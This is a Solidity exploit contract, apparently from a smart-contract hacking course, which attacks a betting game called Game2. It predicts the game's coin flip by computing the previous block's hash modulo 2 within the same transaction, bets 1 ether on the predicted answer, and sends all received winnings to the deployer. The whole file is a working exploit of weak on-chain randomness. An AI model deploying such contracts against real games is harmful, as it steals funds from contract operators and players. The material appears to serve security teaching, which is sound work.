// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policyGPL-3.0-or-later
pragma solidity ^0.8.13;
interface IGame2 {
    function play(bool guess) external payable;
}

/**
 * @title AttackGame2
 * @author JohnnyTime (https://smartcontractshacking.com)
 */
contract AttackGame2 {

    IGame2 game2;
    address owner;
    constructor(address _gameAddress) {
        game2 = IGame2(_gameAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        uint256 number = uint256(blockhash(block.number - 1)) % 2;
        bool answer = number == 1 ? true : false;
        
        // for(uint i=0; i <= 5; i++) {
        //     game2.play{value: 1 ether}(answer);
        // }
        
        game2.play{value: 1 ether}(answer);
    }

    receive() external payable {
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to send ETH");
    }
}